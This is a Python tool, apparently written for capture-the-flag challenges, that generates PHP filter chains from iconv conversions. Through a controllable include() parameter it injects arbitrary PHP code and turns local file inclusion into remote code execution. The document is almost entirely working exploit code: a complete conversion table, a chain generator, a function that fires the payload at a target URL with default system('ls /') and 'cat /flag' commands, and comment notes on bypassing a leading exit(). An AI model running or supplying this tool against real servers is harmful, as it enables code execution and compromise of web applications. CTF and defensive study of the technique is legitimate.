#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
用途: PHP filter chain 生成器(php_filter_chain_generator 风格) —— 用多层 convert.iconv
     编码链"炸弹"合成任意 PHP 代码, 配合 include 可把 LFI 升级成 RCE, 也能绕死亡 exit
适用条件:
    - include/require 参数完全可控(php://filter 可用), 允许后缀拼接也无妨
    - PHP 7.0.29+/7.1.16+/7.2.4+/7.3+ (iconv 过滤器齐全即可)
    - 典型: include($_GET[f].".php") / file_put_contents + 死亡 exit
用法:
    1) 只生成 payload:  python web_php_filter_chain.py -c "system('ls /');" 
    2) 自动打靶:       python web_php_filter_chain.py -u http://target/lfi.php -p file -c "system('cat /flag');"
       (把生成的 chain 作为 -p 指定的 GET 参数发出去)
    3) 绕死亡 exit 时给链头部追加协议前缀见 README 区注释
"""
import argparse
import base64
import re
import requests

# 每个目标 base64 字符对应的 iconv 转换链(逐字符拼接时使用)
CONVERSIONS = {
    "0": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2",
    "1": "convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4",
    "2": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921",
    "3": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE",
    "4": "convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE",
    "5": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2",
    "6": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2",
    "7": "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4",
    "8": "convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2",
    "9": "convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB",
    "A": "convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213",
    "a": "convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE",
    "B": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000",
    "b": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE",
    "C": "convert.iconv.UTF8.CSISO2022KR",
    "c": "convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2",
    "D": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213",
    "d": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5",
    "E": "convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT",
    "e": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937",
    "F": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB",
    "f": "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213",
    "g": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8",
    "G": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90",
    "H": "convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213",
    "h": "convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE",
    "I": "convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213",
    "i": "convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000",
    "J": "convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4",
    "j": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16",
    "K": "convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE",
    "k": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2",
    "L": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC",
    "l": "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE",
    "M": "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T",
    "m": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949",
    "N": "convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4",
    "n": "convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61",
    "O": "convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775",
    "o": "convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE",
    "P": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB",
    "p": "convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4",
    "q": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2",
    "Q": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2",
    "R": "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4",
    "r": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101",
    "S": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS",
    "s": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90",
    "T": "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103",
    "t": "convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS",
    "U": "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943",
    "u": "convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61",
    "V": "convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB",
    "v": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2",
    "W": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936",
    "w": "convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE",
    "X": "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932",
    "x": "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS",
    "Y": "convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361",
    "y": "convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT",
    "Z": "convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16",
    "z": "convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937",
    "/": "convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4",
    "+": "convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157",
    "=": "",
}


def generate_chain(php_code: str) -> str:
    """核心: 目标 PHP 代码 -> base64 -> 从右往左逐字符用 iconv 链合成
    每合成一个字符就 base64-decode/encode 一次, 甩掉非 base64 字符"""
    file_to_use = "php://temp"                       # 固定资源, 无需真实文件
    b64 = base64.b64encode(php_code.encode()).decode().replace("=", "")

    filters = "convert.iconv.UTF8.CSISO2022KR|"      # 先造一段垃圾 base64
    filters += "convert.base64-encode|"
    filters += "convert.iconv.UTF8.UTF7|"            # 用 UTF7 甩掉等号
    for c in b64[::-1]:                              # 逆序逐字符追加转换链
        filters += CONVERSIONS[c] + "|"
        filters += "convert.base64-decode|"          # 解码再编码, 丢弃非法字符
        filters += "convert.base64-encode|"
        filters += "convert.iconv.UTF8.UTF7|"        # 再甩掉新产生的等号
    filters += "convert.base64-decode"               # 最后还原出 PHP 代码

    return f"php://filter/{filters}/resource={file_to_use}"


def exploit(url: str, param: str, php_code: str, method: str, proxy: str) -> None:
    """把 chain 作为指定参数发到目标 include 点"""
    chain = generate_chain(php_code)
    sess = requests.Session()
    if proxy:
        sess.proxies = {"http": proxy, "https": proxy}
    if method.lower() == "post":
        resp = sess.post(url, data={param: chain}, timeout=10)
    else:
        resp = sess.get(url, params={param: chain}, timeout=10)
    print(f"[*] HTTP {resp.status_code}, len={len(resp.text)}")
    # 回显里找命令输出 / flag
    hits = re.findall(r"flag\{.*?\}|CTF\{.*?\}", resp.text)
    print("[+] 疑似 flag:", hits) if hits else print(resp.text[:2000])


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="PHP filter chain LFI->RCE")
    ap.add_argument("-u", "--url", help="目标 include 点 URL, 如 http://t/index.php?file=")
    ap.add_argument("-p", "--param", default="file", help="include 参数名(默认 file)")
    ap.add_argument("-c", "--code", default="system('ls /');", help="要执行的 PHP 代码(不带 <?php)")
    ap.add_argument("-m", "--method", choices=["get", "post"], default="get")
    ap.add_argument("--proxy", help="代理, 如 http://127.0.0.1:8080")
    ap.add_argument("--gen-only", action="store_true", help="只打印 payload 不发请求")
    args = ap.parse_args()

    # 绕死亡 exit 小抄(链前置过滤器, 按需手动拼接):
    #   base64-decode 法: php://filter/convert.base64-decode/resource=<chain>
    #   strip_tags 法(php<7.3): php://filter/string.strip_tags|...?> /resource=<chain>
    if args.gen_only or not args.url:
        print(generate_chain(args.code))
    else:
        exploit(args.url, args.param, args.code, args.method, args.proxy)
